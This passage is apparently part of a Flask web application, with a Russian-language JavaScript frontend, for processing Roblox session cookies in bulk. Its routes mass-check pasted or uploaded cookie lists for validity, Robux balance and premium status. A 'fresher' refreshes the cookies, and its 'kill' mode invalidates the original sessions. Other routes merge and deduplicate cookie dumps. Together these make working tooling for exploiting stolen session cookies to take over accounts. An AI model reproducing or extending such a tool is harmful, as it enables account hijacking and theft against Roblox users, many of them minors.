// --- ПЕРЕКЛЮЧЕНИЕ ВКЛАДОК И СОХРАНЕНИЕ ВЫБРАННОЙ ---
function activateTab(tabName) {
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
    
    const targetBtn = document.querySelector(`.tab[data-tab="${tabName}"]`);
    const targetContent = document.getElementById('tab-' + tabName);
    
    if(targetBtn && targetContent) {
        targetBtn.classList.add('active');
        targetContent.classList.add('active');
        localStorage.setItem('kai_active_tab', tabName);
        if(tabName === 'history') { loadCheckerHistory(); loadFresherHistory(); }
    }
}

document.querySelectorAll('.tab').forEach(tab => {
    tab.addEventListener('click', function() {
        activateTab(this.dataset.tab);
    });
});

// Загрузка сохраненной вкладки при перезагрузке
window.addEventListener('DOMContentLoaded', () => {
    const savedTab = localStorage.getItem('kai_active_tab') || 'checker';
    activateTab(savedTab);
});

function toggleTheme() {
    const html = document.documentElement;
    html.setAttribute('data-theme', html.getAttribute('data-theme')==='dark'?'light':'dark');
}

// Вспомогательная функция сворачивания результатов
function closeBox(id) {
    document.getElementById(id).style.display = 'none';
}

// --- ДРАГ-Н-ДРОП ---
const dropArea = document.getElementById('massDropArea');
['dragenter', 'dragover'].forEach(e => dropArea.addEventListener(e, prev => prev.preventDefault()));
dropArea.addEventListener('drop', e => {
    e.preventDefault();
    if(e.dataTransfer.files.length) {
        document.getElementById('massFile').files = e.dataTransfer.files;
        document.getElementById('massFileInfo').textContent = 'Файл: ' + e.dataTransfer.files[0].name;
    }
});
document.getElementById('massFile').addEventListener('change', function() {
    if(this.files.length) document.getElementById('massFileInfo').textContent = 'Файл: ' + this.files[0].name;
});

// --- API ЛОГИКА ---
async function runSingleCheck() {
    const cookie = document.getElementById('singleCookie').value.trim();
    if(!cookie) return alert('Вставьте кук!');
    document.getElementById('singleContainer').style.display = 'block';
    document.getElementById('singleResult').textContent = '⏳ Проверка...';
    const res = await fetch('/api/single-check', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({cookie}) });
    const data = await res.json();
    document.getElementById('singleResult').textContent = data.report || 'Ошибка';
}

async function runMassCheck() {
    const file = document.getElementById('massFile').files[0];
    if(!file) return alert('Выберите TXT файл!');
    const fd = new FormData(); fd.append('file', file);
    document.getElementById('massContainer').style.display = 'block';
    document.getElementById('massProgress').style.width = '50%';
    document.getElementById('massResult').textContent = '⏳ Массовая проверка...';
    const res = await fetch('/api/mass-check', { method: 'POST', body: fd });
    const data = await res.json();
    document.getElementById('massProgress').style.width = '100%';
    setTimeout(() => document.getElementById('massProgress').style.width = '0%', 1000);
    
    if(data.success) {
        document.getElementById('statValid').textContent = data.valid_count;
        document.getElementById('statRobux').textContent = data.total_robux.toLocaleString();
        document.getElementById('statPremium').textContent = data.premium_count;
        document.getElementById('massResult').textContent = data.results.join('\n\n');
    }
}

function setFresherMode(m) {
    document.getElementById('fresherMode').value = m;
    document.getElementById('btnDup').classList.remove('active-mode');
    document.getElementById('btnKill').classList.remove('active-mode');
    
    if(m === 'duplicate') {
        document.getElementById('btnDup').classList.add('active-mode');
    } else {
        document.getElementById('btnKill').classList.add('active-mode');
    }
}

async function runFresher() {
    const cookies = document.getElementById('fresherCookies').value.trim();
    const mode = document.getElementById('fresherMode').value;
    if(!cookies) return alert('Вставьте куки!');
    document.getElementById('fresherContainer').style.display = 'block';
    document.getElementById('fresherResult').textContent = '⏳ Обновление...';
    const res = await fetch('/api/fresher', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({cookies, mode}) });
    const data = await res.json();
    document.getElementById('fresherResult').textContent = data.only_cookies || 'Ошибка';
}

// --- ВЫВОД ИСТОРИИ C ВОЗМОЖНОСТЬЮ СВЕРНУТЬ БЛОК ---
async function loadCheckerHistory() {
    const res = await fetch('/api/history/checker');
    const data = await res.json();
    let html = '';
    data.history.slice().reverse().forEach((i, idx) => {
        const resultsText = i.results ? i.results.join('\n\n') : 'Нет результатов';
        const boxId = `chk_hist_${idx}`;
        html += `
        <div class="history-card">
            <div class="history-header">
                <span>🕒 ${i.timestamp} (${i.type === 'single' ? 'Одиночная' : 'Массовая'})</span>
                <div style="display:flex;gap:10px;align-items:center;">
                    <span>Валид: ${i.valid} / ${i.total}</span>
                    <button class="btn-close-box" onclick="closeBox('${boxId}')">✖ Свернуть</button>
                </div>
            </div>
            <div class="result-box" id="${boxId}">${resultsText}</div>
        </div>`;
    });
    document.getElementById('checkerHistoryList').innerHTML = html || 'История чекера пуста';
}

async function loadFresherHistory() {
    const res = await fetch('/api/history/fresher');
    const data = await res.json();
    let html = '';
    data.history.slice().reverse().forEach((i, idx) => {
        const cookiesText = i.cookies ? i.cookies.join('\n') : 'Нет кук';
        const boxId = `frs_hist_${idx}`;
        const modeTitle = i.mode === 'kill' ? '💀 Убийство куки' : '♻️ Дублирование';
        html += `
        <div class="history-card">
            <div class="history-header">
                <span>🕒 ${i.timestamp} (Режим: ${modeTitle})</span>
                <div style="display:flex;gap:10px;align-items:center;">
                    <span>Обновлено: ${i.refreshed_count} шт.</span>
                    <button class="btn-close-box" onclick="closeBox('${boxId}')">✖ Свернуть</button>
                </div>
            </div>
            <div class="result-box" id="${boxId}">${cookiesText}</div>
        </div>`;
    });
    document.getElementById('fresherHistoryList').innerHTML = html || 'История фрешера пуста';
}

async function clearCheckerHistory() {
    await fetch('/api/history/checker/clear', {method:'POST'}); loadCheckerHistory();
}

async function clearFresherHistory() {
    await fetch('/api/history/fresher/clear', {method:'POST'}); loadFresherHistory();
}

async function mergeCookies() {
    const files = document.getElementById('mergeFiles').files;
    if(files.length < 2) return alert('Выберите от 2 файлов');
    const fd = new FormData(); Array.from(files).forEach(f => fd.append('files', f));
    const res = await fetch('/api/merge-cookies', {method:'POST', body:fd});
    const data = await res.json();
    document.getElementById('mergeResult').innerHTML = `<a href="${data.download_url}" style="color:var(--accent-pink)">Скачать объединенный файл</a>`;
}

async function cleanCookies() {
    const content = document.getElementById('cleanInput').value;
    const res = await fetch('/api/clean-cookies', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({content, action:'deduplicate'})});
    const data = await res.json();
    document.getElementById('cleanResult').innerHTML = `<a href="${data.download_url}" style="color:var(--accent-pink)">Скачать без дубликатов</a>`;
}
</script>
</body>
</html>"""

# ==========================================
# БЛОК: API МАРШРУТЫ
# ==========================================
@app.route("/")
def index():
    return render_template_string(HTML)

@app.route("/api/single-check", methods=["POST"])
def api_single_check():
    data = request.json or {}
    cookie = data.get("cookie", "").strip()
    if not cookie: return jsonify({"success": False, "message": "Кук не предоставлен"})
    info = get_full_info(cookie)
    report = format_full_report(info)
    add_checker_history({'type': 'single', 'total': 1, 'valid': 1 if info['status']=='✅' else 0, 'results': [report]})
    return jsonify({"success": True, "report": report})

@app.route("/api/mass-check", methods=["POST"])
def api_mass_check():
    content = ""
    if 'file' in request.files: content = request.files['file'].read().decode('utf-8', errors='ignore')
    cookies = extract_cookies_from_text(content)
    if not cookies: return jsonify({"success": False, "message": "Куки не найдены"})
    
    results = mass_check(cookies)
    valid = [r for r in results if r['status']=='✅']
    formatted = [format_quick_report(r) for r in results]
    premium_count = sum(1 for r in valid if r.get('is_premium'))
    total_robux = sum(r.get('robux',0) for r in valid)
    
    add_checker_history({'type': 'mass', 'total': len(results), 'valid': len(valid), 'results': formatted})
    return jsonify({"success": True, "valid_count": len(valid), "premium_count": premium_count, "total_robux": total_robux, "results": formatted})

@app.route("/api/fresher", methods=["POST"])
def api_fresher():
    data = request.json or {}
    raw = data.get("cookies", "")
    mode = data.get("mode", "duplicate")
    cookies_list = extract_cookies_from_text(raw)
    if not cookies_list: return jsonify({"success": False, "message": "Куки не найдены"})
    
    only_cookies = []
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(refresh_roblox_cookie, c, mode=='kill') for c in cookies_list]
        for f in as_completed(futures):
            res = f.result()
            if res['success'] and res['new_cookie']:
                only_cookies.append(res['new_cookie'])
    
    add_fresher_history({'mode': mode, 'refreshed_count': len(only_cookies), 'cookies': only_cookies})
    return jsonify({"success": True, "only_cookies": '\n'.join(only_cookies)})

@app.route("/api/history/checker")
def api_history_checker():
    return jsonify({"history": load_history(CHECKER_HISTORY_FILE)})

@app.route("/api/history/fresher")
def api_history_fresher():
    return jsonify({"history": load_history(FRESHER_HISTORY_FILE)})

@app.route("/api/history/checker/clear", methods=["POST"])
def api_clear_checker_history():
    save_history(CHECKER_HISTORY_FILE, [])
    return jsonify({"success": True})

@app.route("/api/history/fresher/clear", methods=["POST"])
def api_clear_fresher_history():
    save_history(FRESHER_HISTORY_FILE, [])
    return jsonify({"success": True})

@app.route("/api/merge-cookies", methods=["POST"])
def api_merge_cookies():
    files = request.files.getlist('files')
    contents = [f.read().decode('utf-8', errors='ignore') for f in files]
    merged = merge_cookie_files(contents)
    filename = f"merged_{int(time.time())}.txt"
    with open(os.path.join("downloads", filename), 'w') as f: f.write(merged)
    return jsonify({"success": True, "download_url": f"/downloads/{filename}"})

@app.route("/api/clean-cookies", methods=["POST"])
def api_clean_cookies():
    data = request.json or {}
    processed = remove_duplicates(data.get("content", ""))
    filename = f"cleaned_{int(time.time())}.txt"
    with open(os.path.join("downloads", filename), 'w') as f: f.write(processed)
    return jsonify({"success": True, "download_url": f"/downloads/{filename}"})

@app.route("/downloads/<filename>")
def download_file(filename):
    return send_from_directory("downloads", filename, as_attachment=True)

# ==========================================
# ТОЧКА ВХОДА (RENDER / LOCAL)
# ==========================================
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
